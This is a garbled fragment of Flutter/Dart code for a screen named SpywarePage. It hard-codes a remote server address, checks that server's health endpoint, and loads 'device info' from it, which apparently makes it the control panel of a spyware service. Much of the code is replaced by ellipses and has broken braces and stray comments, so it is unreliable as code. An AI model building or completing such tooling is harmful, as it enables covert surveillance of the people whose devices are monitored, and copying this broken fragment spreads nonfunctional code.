...
class _SpywarePageState extends State<SpywarePage> with TickerProviderStateMixin {
  ...
  String baseUrl = "http://yaanzxsuikahost.omdhanebew.my.id:2275/api";
  ...
  void initState() {
    ...
    if (!connected) {
    _showErrorSnackbar('Cannot connect to server. Check your connection.');
    }
   });
     ...
     //   },
      ...
      if (response.statusCode == 200) {
        ...
        if (data['success'] == true) {
          setState(() {
            _deviceInfo = data['data'] ?? data;
          });
        }
      }
    } catch (e) {
  debugPrint('Error fetching device info: $e');
  _showErrorSnackbar('Failed to load device info: $e');
}
  }
  ...
  try {
    final response = await http.get(Uri.parse('$baseUrl/health')).timeout(Duration(seconds: 5));
  ...
  final intValue = int.tryParse(bytes.toString()) ?? 0;
